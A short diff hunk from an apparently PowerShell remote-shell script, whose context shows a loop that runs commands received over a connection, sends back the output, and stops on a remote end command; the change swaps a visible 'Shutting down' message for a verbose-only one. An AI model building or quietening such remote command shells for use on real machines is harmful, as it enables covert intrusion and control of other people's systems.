@@ -84,7 +84,7 @@ while ($connected) {
 
     # Look for the end command which stops the shell remotely
     if ($command -like "*$END_CMD*") {
-        Write-Host "Shutting down"
+        Write-Verbose "Shutting down"
         $connected = $false
     } else {
         # Else execute the command and send the response
